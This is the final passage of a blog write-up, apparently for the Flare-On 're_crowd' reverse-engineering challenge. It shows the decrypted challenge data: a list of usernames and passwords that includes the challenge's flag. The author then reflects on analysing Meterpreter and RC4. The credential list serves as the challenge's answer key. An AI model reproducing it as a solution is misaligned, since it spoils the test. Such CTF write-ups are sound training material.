QgNjMgIDEzIDAwIDQxIDk2IGNhIDY5IDgwIGFlICAgLi4uLnwufWMgLi5BLi5pLi4KMDAwMDAwQzAgIDQ5IGU5IDVkIDBmIDdkIDg5IDQzIGQ0ICA4OSAxYSAwMSBiNCA2MSA2MSAgICAgICAgIEkuXS59LkMuIC4uLi5hYQo) with the key `intrepidmango`. Ta da! Sweet success!\
\
```console\
roy:h4ve_you_tri3d_turning_1t_0ff_and_0n_ag4in@flare-on.com:goat\
moss:Pot-Pocket-Pigeon-Hunt-8:narwhal\
jen:Straighten-Effective-Gift-Pity-1:bunny\
richmond:Inventor-Hut-Autumn-Tray-6:bird\
denholm:123:dog\
```\
\
# Victory! Play Again? [🔗](https://spaceraccoon.dev/imposter-alert-extracting-and-reversing-metasploit-payloads-flare-on-2020/\#victory-play-again)\
\
As a newcomer to reverse engineering, I tackled this challenge with a large variety of static and dynamic analysis tools, picking up tips and tricks from all over the internet. Along the way, I struggled with write-ups that sometimes omitted key instructions and explanations. Hence, I hope this blogpost will be useful, even for beginners.\
\
Out of all the Flare-On challenges I have completed, re\_crowd was my favourite as it forced me to dive into an “everyday” exploit and understand Meterpreter internals. Additionally, I gained a lot of experience in analysing and recognising the RC4 algorithm that is commonly used by malware. I highly recommend this challenge as a realistic training scenario for any cybersecurity specialist! If you are looking to hone your reverse-engineering skills or other domains such as web, mobile, and more, register for GovTech’s [STACK the Flags](https://ctf.tech.gov.sg/) challenge with up to $15,000 in prizes!\
\
[binary](https://spaceraccoon.dev/tags/binary) [reverse engineering](https://spaceraccoon.dev/tags/reverse-engineering)